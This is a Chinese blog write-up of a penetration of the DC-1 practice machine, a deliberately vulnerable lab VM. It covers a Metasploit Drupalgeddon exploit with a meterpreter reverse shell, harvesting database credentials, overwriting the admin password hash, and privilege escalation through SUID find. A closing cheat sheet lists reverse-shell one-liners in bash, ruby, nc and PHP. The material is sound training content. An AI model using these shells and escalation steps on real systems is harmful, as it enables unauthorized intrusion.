<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="DC-1靶机渗透实战"><meta name="keywords" content="靶机渗透"><meta name="author" content="bb,shuiyue75381@gmail.com"><meta name="copyright" content="bb"><title>DC-1靶机渗透实战【bb的博客】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!--link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!--link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!--script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"X7RY6NGU4G","apiKey":"bf7ed65264918bbc03f12b4cc1212d85","indexName":"myblog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
}</script></head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#靶机介绍"><span class="toc-number">1.</span> <span class="toc-text">靶机介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#信息搜集"><span class="toc-number">2.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#渗透实战"><span class="toc-number">3.</span> <span class="toc-text">渗透实战</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">bb</div><div class="author-info-description">This is myblog!</div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/bbkali" target="_blank">GitHub<i class="icon-dot bg-color8"></i></a><a class="links-button button-hover" href="mailto:shuiyue75381@gmail.com" target="_blank">E-Mail<i class="icon-dot bg-color6"></i></a><a class="links-button button-hover" href="tencent://message/?uin=1019593584&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color4"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">86</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">66</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">33</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">bb的博客</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">DC-1靶机渗透实战</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2020-02-04 | 更新于 2020-02-06</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/靶机渗透/">靶机渗透</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/靶机渗透/">靶机渗透</a></div></div></div><div class="main-content"><h3 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h3><p>这次的靶机渗透实战是一个找寻靶机中的flag的过程，并以获得最终的flag为目标。<br>靶机下载地址:<a href="http://www.five86.com/dc-1.html" target="_blank" rel="noopener">http://www.five86.com/dc-1.html</a></p>
<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>直接上nmap进行扫描<br><img src="https://raw.githubusercontent.com/bbkali/picbad/master/2020-2-4-14-8-49" alt="2020-2-4-14-8-49"></p>
<p><strong>可知开放22、80、110端口，linux主机 web可能为Drupal版本号为7</strong></p>
<a id="more"></a>
<h3 id="渗透实战"><a href="#渗透实战" class="headerlink" title="渗透实战"></a>渗透实战</h3><ol>
<li><p>直接msf查询该cms模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/http/drupal_drupageddon) &gt; search drupal</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                           Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                           ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection</span><br><span class="line">   1  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration</span><br><span class="line">   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection</span><br><span class="line">   3  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution</span><br><span class="line">   4  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection</span><br><span class="line">   5  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution</span><br><span class="line">   6  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE</span><br><span class="line">   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用第2个expolit获取shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/http/drupal_drupageddon) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/drupal_drupageddon):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS     172.16.0.2       yes       The target host(s), range CIDR identifier, or hosts file with syntax &apos;file:&lt;path&gt;&apos;</span><br><span class="line">   RPORT      80               yes       The target port (TCP)</span><br><span class="line">   SSL        false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI  /                yes       The target URI of the Drupal installation</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  172.16.0.10      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4445             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Drupal 7.0 - 7.31 (form-cache PHP injection method)</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看本地文件目录发现flag1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo </span><br><span class="line">Computer    : DC-1</span><br><span class="line">OS          : Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686</span><br><span class="line">Meterpreter : php/linux</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">Mode              Size   Type  Last modified              Name</span><br><span class="line">----              ----   ----  -------------              ----</span><br><span class="line">100644/rw-r--r--  174    fil   2013-11-21 04:45:59 +0800  .gitignore</span><br><span class="line">100644/rw-r--r--  5767   fil   2013-11-21 04:45:59 +0800  .htaccess</span><br><span class="line">100644/rw-r--r--  0      fil   2020-01-21 03:52:58 +0800  1.txt</span><br><span class="line">100644/rw-r--r--  1481   fil   2013-11-21 04:45:59 +0800  COPYRIGHT.txt</span><br><span class="line">100644/rw-r--r--  1451   fil   2013-11-21 04:45:59 +0800  INSTALL.mysql.txt</span><br><span class="line">100644/rw-r--r--  1874   fil   2013-11-21 04:45:59 +0800  INSTALL.pgsql.txt</span><br><span class="line">100644/rw-r--r--  1298   fil   2013-11-21 04:45:59 +0800  INSTALL.sqlite.txt</span><br><span class="line">100644/rw-r--r--  17861  fil   2013-11-21 04:45:59 +0800  INSTALL.txt</span><br><span class="line">100755/rwxr-xr-x  18092  fil   2013-11-01 18:14:15 +0800  LICENSE.txt</span><br><span class="line">100644/rw-r--r--  8191   fil   2013-11-21 04:45:59 +0800  MAINTAINERS.txt</span><br><span class="line">100644/rw-r--r--  5376   fil   2013-11-21 04:45:59 +0800  README.txt</span><br><span class="line">100644/rw-r--r--  9642   fil   2013-11-21 04:45:59 +0800  UPGRADE.txt</span><br><span class="line">100644/rw-r--r--  6604   fil   2013-11-21 04:45:59 +0800  authorize.php</span><br><span class="line">100644/rw-r--r--  720    fil   2013-11-21 04:45:59 +0800  cron.php</span><br><span class="line">100644/rw-r--r--  52     fil   2019-02-19 21:20:46 +0800  flag1.txt</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-21 04:45:59 +0800  includes</span><br><span class="line">100644/rw-r--r--  529    fil   2013-11-21 04:45:59 +0800  index.php</span><br><span class="line">100644/rw-r--r--  703    fil   2013-11-21 04:45:59 +0800  install.php</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-21 04:45:59 +0800  misc</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-21 04:45:59 +0800  modules</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-21 04:45:59 +0800  profiles</span><br><span class="line">100644/rw-r--r--  1561   fil   2013-11-21 04:45:59 +0800  robots.txt</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-21 04:45:59 +0800  scripts</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-21 04:45:59 +0800  sites</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-21 04:45:59 +0800  themes</span><br><span class="line">100644/rw-r--r--  19941  fil   2013-11-21 04:45:59 +0800  update.php</span><br><span class="line">100644/rw-r--r--  2178   fil   2013-11-21 04:45:59 +0800  web.config</span><br><span class="line">100644/rw-r--r--  417    fil   2013-11-21 04:45:59 +0800  xmlrpc.php</span><br></pre></td></tr></table></figure>
</li>
</ol>
<blockquote>
<p>meterpreter &gt; cat flag1.txt</p>
</blockquote>
<p><code>flag1.txt</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Every good CMS needs a config file - and so do you</span><br><span class="line"># 提示查看配置文件</span><br></pre></td></tr></table></figure></p>
<ol start="4">
<li>查找配置文件为site/setting.php,并连接本地mysql数据库<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat settings.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&apos;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">$databases = array (</span><br><span class="line">  &apos;default&apos; =&gt; </span><br><span class="line">  array (</span><br><span class="line">    &apos;default&apos; =&gt; </span><br><span class="line">    array (</span><br><span class="line">      &apos;database&apos; =&gt; &apos;drupaldb&apos;,</span><br><span class="line">      &apos;username&apos; =&gt; &apos;dbuser&apos;,</span><br><span class="line">      &apos;password&apos; =&gt; &apos;R0ck3t&apos;,</span><br><span class="line">      &apos;host&apos; =&gt; &apos;localhost&apos;,</span><br><span class="line">      &apos;port&apos; =&gt; &apos;&apos;,</span><br><span class="line">      &apos;driver&apos; =&gt; &apos;mysql&apos;,</span><br><span class="line">      &apos;prefix&apos; =&gt; &apos;&apos;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ul>
<li><p>切换到shell连接mysql,发现不能回显,无法进入交互界面</p>
<blockquote>
<p>mysql -udbuser -pR0ck3t</p>
</blockquote>
</li>
<li><p>用bash回弹一个shell</p>
</li>
</ul>
<ul>
<li>本地监听2222端口<blockquote>
<p>nc -lvp 2222</p>
</blockquote>
</li>
<li>反弹bash,获取到一个可以交互的shell<blockquote>
<p>python -c “import pty;pty.spawn(‘/bin/bash’)” # 获取一个交互shell<br>bash -i &gt;&amp; /dev/tcp/172.16.0.10/2222 0&gt;&amp;1 # 反弹bash</p>
</blockquote>
</li>
</ul>
<ol start="5">
<li><p>查看网站用户账号密码,发现密码经过加密</p>
<blockquote>
<p>select * from users \G;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users \G;</span><br><span class="line">select * from users \G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">             uid: 0</span><br><span class="line">            name: </span><br><span class="line">            pass: </span><br><span class="line">            mail: </span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: NULL</span><br><span class="line">         created: 0</span><br><span class="line">          access: 0</span><br><span class="line">           login: 0</span><br><span class="line">          status: 0</span><br><span class="line">        timezone: NULL</span><br><span class="line">        language: </span><br><span class="line">         picture: 0</span><br><span class="line">            init: </span><br><span class="line">            data: NULL</span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line">             uid: 1</span><br><span class="line">            name: admin</span><br><span class="line">            pass: $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR</span><br><span class="line">            mail: admin@example.com</span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: NULL</span><br><span class="line">         created: 1550581826</span><br><span class="line">          access: 1550583852</span><br><span class="line">           login: 1550582362</span><br><span class="line">          status: 1</span><br><span class="line">        timezone: Australia/Melbourne</span><br><span class="line">        language: </span><br><span class="line">         picture: 0</span><br><span class="line">            init: admin@example.com</span><br><span class="line">            data: b:0;</span><br><span class="line">*************************** 3. row ***************************</span><br><span class="line">             uid: 2</span><br><span class="line">            name: Fred</span><br><span class="line">            pass: $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg</span><br><span class="line">            mail: fred@example.org</span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: filtered_html</span><br><span class="line">         created: 1550581952</span><br><span class="line">          access: 1550582225</span><br><span class="line">           login: 1550582225</span><br><span class="line">          status: 1</span><br><span class="line">        timezone: Australia/Melbourne</span><br><span class="line">        language: </span><br><span class="line">         picture: 0</span><br><span class="line">            init: fred@example.org</span><br><span class="line">            data: b:0;</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
<li><p>根据提示需要进入后台，那直接把admin密码改掉</p>
</li>
</ol>
<ul>
<li>直接根据网站本地脚本对设置的密码进行加密<blockquote>
<p>php scripts/password-hash.sh 123456</p>
</blockquote>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php scripts/password-hash.sh 123456</span><br><span class="line"></span><br><span class="line">password: 123456                hash: $S$DqoimnZKpzNbUFgNiiGexSM.Z29/UXOFtPunnZY0nSHhJBi3RdNP</span><br><span class="line"></span><br><span class="line">www-data@DC-1:/var/www$</span><br></pre></td></tr></table></figure>
<ul>
<li>将加密的密码更新到数据库中<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line">use drupaldb;</span><br><span class="line">update users set pass=&apos;$S$DRP9A87VYWMUnTb4Dl7yivYAlibCNONO32cCB3Qc1LT5Alr90rAu&apos; where uid=1;</span><br><span class="line">select * from users\G;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ol start="7">
<li>通过robots.txt知道登录地址，通过admin登录成功查看flag3</li>
</ol>
<ul>
<li><p>使用设置好的密码：123456，登陆admin账户，在content页面发现了flag3<br><img src="https://raw.githubusercontent.com/bbkali/picbad/master/2020-2-4-16-11-27" alt="2020-2-4-16-11-27"></p>
</li>
<li><p>提示我们特殊的权限权限有助于发现隐藏内容，这里提到了shadow这个单词，于是立即想到/etc/passwd，先打开看看再说</p>
</li>
</ul>
<ol start="8">
<li>查看用户发现flag4用户<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">shell输出</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:104::/var/spool/exim4:/bin/false</span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/false</span><br><span class="line">messagebus:x:103:107::/var/run/dbus:/bin/false</span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ul>
<li>直接打开flag4.txt,提示要进入root目录<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">www-data@DC-1:/var/www $ cd /home</span><br><span class="line">www-data@DC-1:/home $ ls</span><br><span class="line">flag4</span><br><span class="line">www-data@DC-1:/home $ cd flag4</span><br><span class="line">www-data@DC-1:/home/flag4 $ </span><br><span class="line">www-data@DC-1:/home/flag4 $ ls</span><br><span class="line">flag4.txt</span><br><span class="line">www-data@DC-1:/home/flag4 $ cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&apos;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ol start="9">
<li>查看权限文件，发现可以通过find命令suid提权</li>
</ol>
<ul>
<li><p>可使用提权辅助脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</span><br><span class="line">chmod +x LinEnum.sh</span><br><span class="line">./LinEnum.sh</span><br></pre></td></tr></table></figure>
</li>
<li><p>或者直接查看权限命令</p>
<blockquote>
<p>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -perm /4000 2&gt;/dev/null</p>
</blockquote>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/find</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/sbin/mount.nfs</span><br></pre></td></tr></table></figure>
<ul>
<li>find命令suid提权<blockquote>
<p>touch test # 创建一个空文件<br>find test -exec ‘whoami’ \; #查看是否提权<br>find test -exec ‘/bin/sh’ \;#将root的bash反弹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cd root</span><br><span class="line">ls</span><br><span class="line">thefinalflag.txt</span><br><span class="line">cat thefinalflag.txt</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&apos;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<p>至此获得所有的flag</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li><p>反弹bash的不同脚本命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python: python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">ruby: ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;ip&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</span><br><span class="line">nc: nc -e /bin/bash ip port</span><br><span class="line">php:&lt;?php</span><br><span class="line">$sock=fsockopen(&quot;ip&quot;,port);//自己的外网ip，端口任意</span><br><span class="line">exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>SUID提权</p>
<blockquote>
<p>find test -exec ‘/bin/sh’ \;</p>
</blockquote>
</li>
</ul>
